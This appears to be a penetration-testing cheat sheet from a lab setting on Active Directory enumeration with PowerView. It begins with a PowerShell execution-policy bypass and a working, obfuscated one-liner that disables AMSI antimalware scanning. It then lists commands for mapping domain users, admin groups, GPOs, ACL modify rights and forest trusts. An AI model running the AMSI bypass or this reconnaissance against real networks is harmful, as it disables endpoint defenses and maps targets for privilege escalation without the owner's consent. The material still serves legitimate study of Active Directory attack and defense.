# Domain Enumeration

_**Enumerate Domain: − Users − Computers − Domain Administrators − Enterprise Administrators − Shares**_

**Script Bypass:** powershell -ep bypass

**Bypass amsi**: sET-ItEM \( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' \) \( \[TYpE\]\( "{1}{0}"-F'F','rE' \) \) ; \( GeT-VariaBle \( "1Q2U" +"zX" \) -VaL \)."A`ss`Embly"."GET`TY`Pe"\(\( "{6}{3}{1}{4}{2}{0}{5}" - f'Util','A','Amsi','.Management.','utomation.','s','System' \) \)."g`etf`iElD"\( \( "{0}{2}{1}" -f'amsi','d','InitFaile' \),\( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' \)\)."sE`T`VaLUE"\( ${n`ULl},${t`RuE} \)

Powerview: .  .\PowerView.ps1

* Get-NetUser
* List property of all users,
  * Get-NetUser \| select -ExpandProperty samaccountname
* Enumerate member computers
  * Get-NetComputer
* Attributes of Domain Admin Group
  * Get-NetGroup -GroupName "Domain Admins" -FullData
* Enumerate members of Domain Admin Group:
  * Get-NetGroupMember -GroupName "Domain Admins"
* Enumerate members of Enterprise Group:
  * Get-NetGroupMember -GroupName "Enterprise Admins"
  * Get-NetGroupMember -GroupName "Enterprise Admins" –Domain xxxx.local
* Find Interesting Shares:
  * Invoke-ShareFinder -ExcludeStandard -ExcludePrint -ExcludeIPC –Verbose

**ENUMERATING GPO & ENUMERATE RESTRICTED GROUPS from GPO:**

* Get-NetGPOGroup -Verbose
* Look for memberships of the Group "RDPUsers" 
  * Get-NetGroupMember -GroupName RDPUsers
* List all the OUs:
  * Get-NetOU
* List all computers in specific OU:
  * Get-NetOU LockedMachines \| %{Get-NetComputer -ADSPath $\_}
* List GPOs:
  * Get-NetGPO
* Enumerate GPO applied in specific OU:
  * \(Get-NetOU LockedMachines -FullData\).gplink \[LDAP://cn={3E04167E-C2B6-4A9A-8FB7- C811158DC97C},cn=policies,cn=system,DC=lockedcorp,DC=lockedcorp,DC=local;0\]
  * Get-NetGPO -ADSpath 'LDAP://cn={3E04167E-C2B6-4A9A-8FB7- C811158DC97C},cn=policies,cn=system,DC=lockedcorp,DC=lockedcorp,DC=local'

**ENUMERATING ACLS**

Enumerate ACLs with Powerview

* Get-ObjectAcl -SamAccountName "users" -ResolveGUIDs -Verbose
* Enumerate ACLs of Domain Admin Group
  * Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs - Verbose
* Enumerate ACLs for all GPOs:
  * Get-NetGPO \| %{Get-ObjectAcl -ResolveGUIDs -Name $\_.Name}
* Enumerate GPO for user or RDPUser group
  * Get-NetGPO \| %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} ?{$_.IdentityReference -match "user"}
* Check for modify rights/persmissions 
  * Invoke-ACLScanner -ResolveGUIDs \| ?{$\_.IdentityReference - match "student"}
  * Invoke-ACLScanner -ResolveGUIDs \| ?{$\_.IdentityReference - match "RDPUsers"}

**ENUMERATE TRUSTS:**

* Enumerate ALL domains
  * Get-NetForestDomain -Verbose
* Map the trusts of the domain:
  * Get-NetDomainTrust
* Map all trusts to forest:
  * Get-NetForestDomain -Verbose \| Get-NetDomainTrust
* List only external trusts
  * Get-NetForestDomain -Verbose \| Get-NetDomainTrust \| ?{$\_.TrustType -eq 'External'}
* Identify external trusts of domain
  * Get-NetDomainTrust \| ?{$\_.TrustType -eq 'External'}
* If Bi-directional trust try and extract info from forest:
  * Get-NetForestDomain -Forest lockercorp.local -Verbose \| Get- NetDomainTrust

